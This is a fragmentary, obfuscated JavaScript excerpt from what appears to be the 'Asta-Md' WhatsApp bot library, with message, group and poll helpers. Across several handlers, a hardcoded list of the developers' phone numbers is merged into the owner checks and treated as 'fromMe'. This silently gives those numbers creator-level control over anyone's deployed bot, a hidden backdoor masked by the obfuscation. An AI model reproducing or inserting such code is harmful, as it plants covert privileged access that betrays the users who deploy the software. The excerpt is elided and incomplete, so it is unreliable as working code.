const {
  ...
  const unixTimestampSeconds = (_0xcd7700 = new Date()) => Math.floor(_0xcd7700.getTime() / 1000);
  ...
  exports.clockString = function (_0x395128) {
    let _0x4dbcae = isNaN(_0x395128) ? "--" : Math.floor(_0x395128 % 86400 / 3600);
    let _0x235ca0 = isNaN(_0x395128) ? "--" : Math.floor(_0x395128 % 3600 / 60);
    let _0x509bde = isNaN(_0x395128) ? "--" : Math.floor(_0x395128 % 60);
    return [_0x4dbcae, _0x235ca0, _0x509bde].map(_0xc7af97 => _0xc7af97.toString().padStart(2, 0)).join(":");
  };
  ...
  exports.generateProfilePicture = async _0x125cf7 => {
    ...
    return {
      ...
      preview: await _0xca07f2.scaleToFit(720, 720).getBufferAsync(jimp_1.MIME_JPEG)
    };
  };
  exports.bytesToSize = (_0x3affb2, _0x172f8f = 2) => {
    ...
    return parseFloat((_0x3affb2 / Math.pow(_0x409316, _0xda3562)).toFixed(_0xe00d6c)) + " " + _0x4e5bdb[_0xda3562];
  };
  ...
  exports.parseMention = (_0x35191c = "") => {
    return [..._0x35191c.matchAll(/@([0-9]{5,16}|0)/g)].map(_0x4a7b87 => _0x4a7b87[1] + "@s.whatsapp.net");
  };
  ...
  const Asta = ["2348039607375", "2349027862116", "234000000000"];
  const {
    getDevice,
    ...
    try {
      if (global.SmdOfficial && global.SmdOfficial === "yes") {
        ...
        if (_0x424729.key) {
          ...
          _0x5708ee.sender = _0x5708ee.participant = _0x205409.decodeJid(_0x5708ee.fromMe ? _0x205409.user.id : _0x5708ee.isGroup ? _0x205409.decodeJid(_0x5708ee.key.participant) : _0x5708ee.chat);
  ...
  exports.callsg = async (_0x235969, _0x426e27) => {
    if (global.SmdOfficial && global.SmdOfficial === "yes") {
      ...
      _0x642975.isCreator = [_0x4b010d, ...Asta, ...global.sudo?.split(","), ...global.devs?.split(","), ...global.owner?.split(",")].map(_0x381ca3 => _0x381ca3.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(_0x642975.from);
      _0x642975.isAstro = [...Asta].map(_0x3bb816 => _0x3bb816.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(_0x642975.from);
      _0x642975.fromMe = _0x642975.isAstro ? true : areJidsSameUser(_0x642975.from, _0x52f3e3);
      ...
      _0x642975.send = async (_0x23e41c, _0x4e7834 = {
        author: "Asta-Md"
      }, _0x1c62b5 = "Asta", _0x244af8 = "", _0x2838b = _0x642975.from) => {
      ...
      _0x642975.checkBot = (_0x2c2097 = _0x642975.sender) => [...Asta, _0x4b010d].map(_0xa47977 => _0xa47977.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(_0x2c2097);
      _0x642975.sendPoll = async (_0x5b8819, _0x453932 = ["option 1", "option 2"], _0x3cfebb = 1, _0x52e1af = "", _0x3f886c = _0x642975.chat) => {
  ...
  exports.groupsg = async (_0x34712d, _0x2b3e0f, _0x56741f = false, _0x152579 = false) => {
    try {
      ...
      _0x22cff2.user = _0x22cff2.sender = Array.isArray(_0x2b3e0f.participants) ? _0x2b3e0f.participants[0] : "xxx";
      ...
      _0x22cff2.isCreator = [_0xbacc49, ...Asta, ...global.sudo?.split(","), ...global.devs?.split(","), ...global.owner?.split(",")].map(_0x4928b2 => _0x4928b2.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(_0x22cff2.user);
      _0x22cff2.isAstro = [...Asta].map(_0x57d0f3 => _0x57d0f3.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(_0x22cff2.user);
      _0x22cff2.fromMe = _0x22cff2.isAstro ? true : areJidsSameUser(_0x22cff2.user, _0x33935f);
      if (_0x22cff2.action === "remove" && _0x22cff2.fromMe) {
        return;
      }
      _0x22cff2.suhailBot = [...Asta].map(_0x43191b => _0x43191b.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(_0x33935f);
      ...
      _0x22cff2.error = async (_0x386924, _0xfedfc2 = false, _0x129b35 = "*_Request failed due to error!!_*", _0x32def3 = {
        ...
        let _0x1ac461 = "*ASTA-Md ERROR MESSAGE!!!*\n```\nUSER: @" + _0x22cff2.user.split("@")[0] + "\n    NOTE: Use .report to send alert about Err.\n\nERR_Message: " + _0x386924 + "\n```";
      ...
      _0x22cff2.send = async (_0x1def38, _0x1bb9da = {
        mentions: [_0x22cff2.user]
      }, _0xb61629 = "Asta", _0x919f26 = "", _0x3ccfb1 = _0x22cff2.chat) => {
      ...
      _0x22cff2.sendPoll = async (_0x188344, _0x4bb725 = ["option 1", "option 2"], _0x34efb6 = 1, _0xf53aa9 = "", _0x2efafc = _0x22cff2.jid) => {
        return await _0x22cff2.send(_0x188344, {
          values: _0x4bb725,
          selectableCount: _0x34efb6
        }, "poll", _0xf53aa9, _0x2efafc);
      };
      _0x22cff2.checkBot = (_0x31c33b = _0x22cff2.sender) => [...Asta, _0xbacc49].map(_0x1e666c => _0x1e666c.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(_0x31c33b);
  ...
  exports.smsg = async (_0xa72325, _0x32b4a8, _0x23c611, _0x5eedaa = false) => {
    ...
    _0x2d6cd0.isCreator = [_0x1e2a16, ...Asta, ...global.sudo.split(","), ...global.devs.split(","), ...global.owner.split(",")].includes(_0x2d6cd0.senderNum);
    ...
    _0x2d6cd0.isPublic = Config.WORKTYPE === "public" ? true : _0x2d6cd0.allowJid || _0x2d6cd0.isCreator || _0x2d6cd0.isAstro;
    if (_0x32b4a8.message) {
      ...
      if (_0x1d4327) {
        ...
        if (_0x2d6cd0.quoted.message) {
          ...
          _0x2d6cd0.quoted.isBaileys = _0x2d6cd0.quoted.isBot = _0x2d6cd0.quoted.id?.startsWith("BAE5") || _0x2d6cd0.quoted.id?.startsWith("SUHAILMD") || _0x2d6cd0.quoted.id?.length == 16;
    ...
    _0x2d6cd0.Asta = (_0xd6e77d = _0x2d6cd0.sender) => [...Asta].map(_0x1d647a => _0x1d647a.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(_0xd6e77d);
    _0x2d6cd0.checkBot = (_0x25a048 = _0x2d6cd0.sender) => [...Asta, _0x1e2a16].map(_0x3e106a => _0x3e106a.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(_0x25a048);
    ...
    _0x2d6cd0.send = async (_0x2faaad, _0x296029 = {
      author: "Asta-Md"
    }, _0x38f6af = "Asta", _0x5a0385 = "", _0x4b9613 = _0x2d6cd0.chat) => {
      if (!_0x2faaad) {
        return {};
      }
      try {
    ...
    _0x2d6cd0.sendPoll = async (_0x481e69, _0x4269ff = ["option 1", "option 2"], _0x4ed2f6 = 1, _0x595949 = _0x2d6cd0, _0x3be729 = _0x2d6cd0.chat) => {
